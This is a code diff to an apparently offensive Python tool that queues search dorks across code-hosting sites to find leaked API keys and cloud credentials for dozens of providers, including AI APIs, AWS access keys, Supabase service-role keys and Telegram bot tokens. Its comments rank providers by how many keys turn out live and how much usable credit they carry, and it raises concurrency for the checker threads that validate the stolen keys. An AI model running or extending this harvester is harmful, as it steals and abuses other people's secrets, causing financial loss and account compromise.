@@ -15,22 +15,71 @@ import time
 # Provider dorks: DashScope first, then the pools we actually consume.
 # A handful of high-signal queries per repo host beats 20 generic sources.
 PROVIDER_DORKS = [
-    ('"dashscope.aliyuncs.com" "sk-"', 900),
-    ('"dashscope-intl.aliyuncs.com" "sk-"', 890),
-    ('"DASHSCOPE_API_KEY"', 880),
-    ('"compatible-mode/v1" "sk-"', 870),
-    ('"qwen3" "sk-" filename:.env', 860),
-    ('"xi-api-key" filename:.env', 850),
-    ('"ELEVENLABS_API_KEY"', 840),
-    ('"api.deepseek.com" "sk-"', 830),
-    ('"api.siliconflow.cn" "sk-"', 820),
-    ('"generativelanguage.googleapis.com" "AIza"', 810),
-    ('"openrouter.ai" "sk-or-v1-', 800),
-    ('"api.together.xyz" "sk-"', 790),
-    ('"api.groq.com" "gsk_"', 780),
-    ('"integrate.api.nvidia.com" "nvapi-"', 770),
-    ('"api.moonshot" "sk-"', 760),
-    ('"api.z.ai" "sk-"', 750),
+    # --- ElevenLabs: высокая отдача (реальные остатки символов) ---
+    ('"xi-api-key"', 1000),
+    ('"xi-api-key" filename:.env', 995),
+    ('"ELEVENLABS_API_KEY"', 990),
+    ('"elevenlabs" "sk_"', 985),
+    ('"api.elevenlabs.io" "xi-api-key"', 980),
+    ('"ELEVEN_LABS_API_KEY"', 975),
+    ('"xi-api-key" path:config', 970),
+    # --- OpenRouter / Groq / NVIDIA / HF ---
+    ('"sk-or-v1-"', 940),
+    ('"OPENROUTER_API_KEY"', 938),
+    ('"openrouter.ai/api/v1" "sk-or-"', 936),
+    ('"gsk_" "api.groq.com"', 930),
+    ('"GROQ_API_KEY"', 928),
+    ('"nvapi-"', 920),
+    ('"integrate.api.nvidia.com" "nvapi-"', 918),
+    ('"huggingface" "hf_" filename:.env', 910),
+    ('"HF_TOKEN"', 908),
+    # --- Google / DeepSeek / SiliconFlow / Moonshot / ZAI ---
+    ('"AIza" "generativelanguage.googleapis.com"', 900),
+    ('"GEMINI_API_KEY"', 898),
+    ('"api.deepseek.com" "sk-"', 890),
+    ('"DEEPSEEK_API_KEY"', 888),
+    ('"api.siliconflow.cn" "sk-"', 880),
+    ('"SILICONFLOW_API_KEY"', 878),
+    ('"api.moonshot" "sk-"', 870),
+    ('"MOONSHOT_API_KEY"', 868),
+    ('"api.z.ai" "sk-"', 860),
+    ('"ZHIPU_API_KEY"', 858),
+    # --- DashScope: много находок, мало живых; ценны только sk-ws- ---
+    ('"sk-ws-" "dashscope"', 855),
+    ('"sk-ws-" "aliyuncs"', 853),
+    ('"DASHSCOPE_API_KEY"', 851),
+    ('"dashscope-intl.aliyuncs.com"', 849),
+    ('"compatible-mode/v1" "sk-"', 847),
+    # --- прочие провайдеры ---
+    ('"xai-" "api.x.ai"', 840),
+    ('"sk-ant-" "api.anthropic.com"', 838),
+    ('"r8_" "api.replicate.com"', 830),
+    ('"fal-key" "fal.run"', 828),
+    ('"pplx-"', 820),
+    ('"csk-" "api.cerebras.ai"', 818),
+    ('"api.mistral.ai" "sk-"', 810),
+    ('"api.cohere.ai" "sk-"', 808),
+    ('"api.deepgram.com" "Token"', 800),
+    ('"api.assemblyai.com" "sk_"', 798),
+    ('"re_" "api.resend.com"', 790),
+    ('"SG." "api.sendgrid.com"', 788),
+    ('"api.telegram.org/bot"', 780),
+    ('"service_role" "supabase.co"', 770),
+    ('"CLOUDFLARE_API_TOKEN"', 760),
+    ('"AKIA" "aws_access_key_id" filename:.env', 750),
+    ('"api.stability.ai" "sk-"', 740),
+    ('"api.voyageai.com" "pa-"', 730),
+    ('"jina_" "api.jina.ai"', 720),
+    ('"tvly-"', 710),
+    ('"fc-" "api.firecrawl.dev"', 700),
+    ('"modal.token"', 690),
+    ('"rpa_" "api.runpod.ai"', 680),
+    ('"api_token" "bria"', 670),
+    ('"camb.ai" "x-api-key"', 660),
+    # --- классы с нулевой отдачей: держим низко, только для полноты ---
+    ('"api.together.xyz" "sk-"', 400),
+    ('"OPENAI_API_KEY"', 390),
+    ('"api.fish.audio"', 380),
 ]
 
 SOURCE_LANES = [
@@ -51,8 +100,10 @@ def seed_dorks(con, node_idx, node_n):
         for lane, pen in SOURCE_LANES:
             tasks.append((lane, query, weight + pen))
     added = 0
+    shard_n = max(1, min(4, node_n))  # 4 groups: keeps the per-node cycle long enough that
+    shard_i = node_idx % shard_n      # repeated queries actually return fresh results
     for i, (lane, query, prio) in enumerate(tasks):
-        if i % node_n != node_idx:
+        if i % shard_n != shard_i:
             continue
         cur = con.execute(
             "INSERT OR IGNORE INTO source_tasks(source,query,priority,enabled) VALUES(?,?,?,1)",
@@ -85,6 +136,12 @@ def main() -> int:
         try:
             for k, v in (("auto_cards", auto_cards), ("auto", "1"),
                          ("auto_batch", auto_batch),
+                         ("pat_burst", os.environ.get("PAT_BURST", "8")),
+                         ("concurrency", os.environ.get("CONCURRENCY", "40")),
+                         ("probe_concurrency", os.environ.get("PROBE_CONCURRENCY", "8")),
+                         ("deep_concurrency", os.environ.get("DEEP_CONCURRENCY", "16")),
+                         ("page_concurrency", os.environ.get("PAGE_CONCURRENCY", "8")),
+                         ("checker_threads", os.environ.get("CHECKER_THREADS", "32")),
                          ("notify_limit", os.environ.get("NOTIFY_LIMIT", "0")),
                          ("checker_models", os.environ.get("CHECKER_MODELS", "10"))):
                 con.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)", (k, v))
